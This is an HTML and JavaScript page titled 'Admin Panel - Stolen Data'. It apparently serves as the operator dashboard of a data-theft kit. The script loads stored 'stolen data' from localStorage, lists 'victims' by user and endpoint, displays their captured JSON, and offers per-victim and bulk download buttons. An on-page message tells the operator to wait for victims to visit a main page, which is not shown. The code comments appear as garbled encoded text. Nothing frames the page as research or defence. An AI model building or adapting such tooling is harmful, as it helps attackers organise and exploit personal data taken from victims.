<!DOCTYPE html>
<html>
<head>
    <title>Admin Panel - Stolen Data</title>
    <style>
        body { font-family: Arial; margin: 20px; background: #1a1a1a; color: #00ff00; }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { background: #2d3748; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
        .stats { display: flex; gap: 15px; margin: 20px 0; flex-wrap: wrap; }
        .stat { background: #4a5568; padding: 15px; border-radius: 8px; min-width: 150px; text-align: center; }
        .victim-list { background: #2d3748; padding: 20px; border-radius: 10px; margin: 20px 0; }
        .victim { background: #4a5568; padding: 15px; margin: 10px 0; border-radius: 8px; cursor: pointer; }
        .victim:hover { background: #5a6578; }
        .data-view { background: #2d3748; padding: 20px; border-radius: 10px; margin: 20px 0; }
        pre { background: #000; color: #0f0; padding: 15px; border-radius: 5px; overflow-x: auto; font-size: 12px; max-height: 500px; overflow-y: auto; }
        button { background: #48bb78; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin: 5px; }
        button:hover { background: #38a169; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üïµÔ∏è Admin Panel - Stolen Data</h1>
            <p>Total victims: <span id="victimCount">0</span></p>
            <button onclick="refreshData()">üîÑ Refresh Data</button>
            <button onclick="downloadAllData()">üíæ Download All Data</button>
            <button onclick="clearAllData()">üóëÔ∏è Clear All Data</button>
        </div>

        <div class="stats">
            <div class="stat">
                <div id="totalEndpoints">0</div>
                <div>Endpoints</div>
            </div>
            <div class="stat">
                <div id="totalUsers">0</div>
                <div>Users</div>
            </div>
            <div class="stat">
                <div id="lastUpdate">Never</div>
                <div>Last Update</div>
            </div>
        </div>

        <div class="victim-list">
            <h3>üéØ Collected User Data</h3>
            <div id="victimsContainer"></div>
        </div>

        <div class="data-view">
            <h3>üìä Data Viewer</h3>
            <div id="dataDisplay">
                <p>Select a user to view their data</p>
            </div>
        </div>
    </div>

    <script>
        let allData = {};
        
        // –ó–∞–≥—Ä—É–∂–∞–µ–º –¥–∞–Ω–Ω—ã–µ
        function loadData() {
            const saved = localStorage.getItem('admin_stolen_data');
            allData = saved ? JSON.parse(saved) : {};
            updateStats();
            displayVictims();
        }
        
        // –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É
        function updateStats() {
            const endpoints = Object.keys(allData);
            const users = new Set();
            
            endpoints.forEach(endpoint => {
                if (allData[endpoint].user) {
                    users.add(allData[endpoint].user);
                }
            });
            
            document.getElementById('victimCount').textContent = users.size;
            document.getElementById('totalEndpoints').textContent = endpoints.length;
            document.getElementById('totalUsers').textContent = users.size;
            document.getElementById('lastUpdate').textContent = new Date().toLocaleTimeString();
        }
        
        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Å–ø–∏—Å–æ–∫ –∂–µ—Ä—Ç–≤
        function displayVictims() {
            const container = document.getElementById('victimsContainer');
            container.innerHTML = '';
            
            const users = {};
            
            // –ì—Ä—É–ø–ø–∏—Ä—É–µ–º –ø–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º
            Object.keys(allData).forEach(endpoint => {
                const item = allData[endpoint];
                const user = item.user || 'unknown';
                
                if (!users[user]) {
                    users[user] = [];
                }
                users[user].push({ endpoint, ...item });
            });
            
            // –°–æ–∑–¥–∞–µ–º —ç–ª–µ–º–µ–Ω—Ç—ã –¥–ª—è –∫–∞–∂–¥–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
            Object.keys(users).forEach(user => {
                const victimDiv = document.createElement('div');
                victimDiv.className = 'victim';
                victimDiv.onclick = () => showUserData(user, users[user]);
                
                victimDiv.innerHTML = `
                    <strong>üë§ ${user}</strong>
                    <span style="float: right; color: #aaa;">
                        ${users[user].length} endpoints ‚Ä¢ ${new Date(users[user][0].timestamp).toLocaleDateString()}
                    </span>
                `;
                
                container.appendChild(victimDiv);
            });
            
            if (Object.keys(users).length === 0) {
                container.innerHTML = '<p>No data collected yet. Wait for victims to visit the main page.</p>';
            }
        }
        
        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –¥–∞–Ω–Ω—ã–µ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        function showUserData(user, userData) {
            const display = document.getElementById('dataDisplay');
            let html = `<h4>üë§ User: ${user}</h4>`;
            
            userData.forEach(item => {
                html += `
                    <div style="margin: 15px 0;">
                        <strong>üìÅ ${item.endpoint}</strong>
                        <small style="color: #aaa;"> - ${new Date(item.timestamp).toLocaleString()}</small>
                        <pre>${JSON.stringify(item.data, null, 2)}</pre>
                        <button onclick="downloadUserData('${user}', '${item.endpoint}')">üì• Download ${item.endpoint}</button>
                    </div>
                `;
            });
            
            html += `<button onclick="downloadAllUserData('${user}')">üíæ Download All Data for ${user}</button>`;
            display.innerHTML = html;
        }
        
        // –°–∫–∞—á–∏–≤–∞–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö
        function downloadUserData(user, endpoint) {
            const data = allData[endpoint];
            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `victim-${user}-${endpoint}-${Date.now()}.json`;
            a.click();
            URL.revokeObjectURL(url);
        }
        
        function downloadAllUserData(user) {
            const userData = {};
            Object.keys(allData).forEach(endpoint => {
                if (allData[endpoint].user === user) {
                    userData[endpoint] = allData[endpoint];
                }
            });
            
            const blob = new Blob([JSON.stringify(userData, null, 2)], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `victim-${user}-complete-${Date.now()}.json`;
            a.click();
            URL.revokeObjectURL(url);
        }
        
        function downloadAllData() {
            const blob = new Blob([JSON.stringify(allData, null, 2)], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `all-stolen-data-${Date.now()}.json`;
            a.click();
            URL.revokeObjectURL(url);
        }
        
        function clearAllData() {
            if (confirm('Delete ALL stolen data?')) {
                localStorage.removeItem('admin_stolen_data');
                allData = {};
                loadData();
            }
        }
        
        function refreshData() {
            loadData();
        }
        
        // –ê–≤—Ç–æ-–æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∫–∞–∂–¥—ã–µ 5 —Å–µ–∫—É–Ω–¥
        window.onload = function() {
            loadData();
            setInterval(loadData, 5000);
        };
    </script>
</body>
</html>
